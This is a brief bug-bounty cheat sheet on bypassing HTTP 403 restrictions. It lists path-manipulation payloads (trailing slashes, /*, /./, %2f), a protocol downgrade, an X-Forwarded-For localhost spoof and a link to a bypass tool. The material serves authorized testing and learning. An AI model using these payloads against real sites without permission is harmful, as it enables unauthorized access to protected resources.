## 403 Bypass
I am sharing all this tips and techniques from my own personal experience there no official references for that

### Directory Based
If you see directory with no slash at end then do these acts there
```
site.com/secret => 403
site.com/secret/* => 200
site.com/secret/./ => 200
```
### File Base
If you see file without any slash at end then do these acts there
```
site.com/secret.txt => 403
site.com/secret.txt/ => 200
site.com/%2f/secret.txt/ => 200
```
### Protocol Base
Well, sound wired but check out the example for better understanding
```
https://site.com/secret => 403
http://site.com/secret => 200
```
## Payloads
```
/
/*
/%2f/
/./
./.
/*/
```
### Header
[https://observationsinsecurity.com/2020/08/09/bypassing-403-to-get-access-to-an-admin-console-endpoints/](https://observationsinsecurity.com/2020/08/09/bypassing-403-to-get-access-to-an-admin-console-endpoints/)
```
X-Forwarded-For: 127.0.0.1
```

### Tools
Here is a Tool I found on twitter.
* [https://github.com/yunemse48/403bypasser](https://github.com/yunemse48/403bypasser)

## Proof Of Concept
Well Always look for some references or proof of concept if someone sharing any tips so you may confirm you are not wasting your time at all.
I have some poc video on my YouTube channel for 403 and other Improper access control bugs with those methods. You can check them

YouTube: [Mehedi Hasan Remon](https://www.youtube.com/channel/UCF_yxU7acxUojiGiOAMafQQ/videos?view_as=subscriber)

Author:[@remonsec](https://twitter.com/remonsec)
       [@KathanP19](https://twitter.com/KathanP19)
